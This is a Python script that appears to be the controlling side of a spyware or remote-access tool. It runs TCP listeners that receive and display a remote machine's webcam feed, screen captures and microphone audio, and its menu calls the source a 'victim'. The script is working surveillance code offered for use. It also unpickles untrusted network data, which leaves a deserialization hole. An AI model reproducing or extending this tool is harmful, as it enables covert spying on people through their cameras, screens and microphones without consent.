import socket
import struct
import cv2
import numpy as np
import pickle
import pyaudio
import sys

def receive_audio_from_client(server_ip='0.0.0.0', server_port=8080):
    chunk_size = 1024
    audio_format = pyaudio.paInt16
    channels = 1
    rate = 44100
    # Initialize audio stream for playback
    p = pyaudio.PyAudio()
    stream = p.open(format=audio_format, channels=channels, rate=rate, output=True, frames_per_buffer=chunk_size)

    # Start socket server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(1)
    print("Waiting for a connection...")
    client_socket, addr = server_socket.accept()
    print(f"Connected to {addr}")

    try:
        while True:
            try:
                # Receive data size first
                data_size = struct.unpack("L", client_socket.recv(4))[0]
                
                # Receive the actual audio data
                audio_data = client_socket.recv(data_size)

                # Play audio
                stream.write(audio_data)
            except socket.error as e:
                print(f"Socket error: {e}")
                break  # Exit the loop if there's a socket error

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

    finally:
        # Cleanup
        print("Closing resources...")
        stream.stop_stream()
        stream.close()
        p.terminate()
        client_socket.close()
        server_socket.close()
        sys.exit()  # Exit the program

def start_streaming_server(server_ip='0.0.0.0', server_port=8080):
    know = """
    Starts a server that listens for incoming connections and displays the received video stream.

    :param server_ip: IP address to bind the server to. Default is '0.0.0.0' (all interfaces).
    :param server_port: Port number to bind the server to. Default is 8080.
    """
    print(know)
    # Create socket to listen for incoming connections
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(1)
    print("[INFO] Server listening on port", server_port)

    # Accept a connection
    conn, addr = server_socket.accept()
    print("[INFO] Connection from", addr)

    try:
        while True:
            # Receive data size
            data_size = struct.unpack("L", conn.recv(struct.calcsize("L")))[0]
            data = b""

            # Receive data
            while len(data) < data_size:
                packet = conn.recv(data_size - len(data))
                if not packet:
                    break
                data += packet

            # Deserialize the frame
            frame = pickle.loads(data)

            # Display the frame
            cv2.imshow("Stream", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    finally:
        # Cleanup resources
        cv2.destroyAllWindows()
        conn.close()
        server_socket.close()


def start_server_for_video_streaming(host_ip, host_port, window_size=(1000, 600)):
    know = """
    Starts a server that listens for incoming connections and displays the received video stream.

    :param server_ip: IP address to bind the server to. Default is '0.0.0.0' (all interfaces).
    :param server_port: Port number to bind the server to. Default is 8080.
    """
    print(know)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host_ip, host_port))
    server_socket.listen(1)
    
    print("Server listening on {}:{}".format(host_ip, host_port))
    
    conn, addr = server_socket.accept()
    print("Connected to", addr)
    
    try:
        while True:
            # Receive the size of the data
            data_size = struct.unpack("L", conn.recv(struct.calcsize("L")))[0]
            # Receive the actual data
            data = b""
            while len(data) < data_size:
                packet = conn.recv(data_size - len(data))
                if not packet:
                    break
                data += packet
            
            # Convert the received data to an image
            nparr = np.frombuffer(data, np.uint8)
            screen_np = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            if screen_np is None:
                print("Failed to decode image")
                continue
            
            # Convert the image from RGB to BGR
            screen_np = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
            
            # Resize the image
            resized_screen = cv2.resize(screen_np, window_size)
            
            # Display the resized image
            cv2.imshow("Screen", resized_screen)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
    
    finally:
        conn.close()
        server_socket.close()
        cv2.destroyAllWindows()


def Main():
    banner = """"
    listener:
    
    1)webcam stream
    2)video stream
    3)listen to victim stream

    """
    print(banner)
    choice = input("choice: ")
    
    if choice == "1":
       start_streaming_server(server_ip='0.0.0.0', server_port=8080)
    if choice == "2":
       start_server_for_video_streaming('0.0.0.0', 8080)
    if choice == "3":
        receive_audio_from_client()
    else:
        Main()

Main()
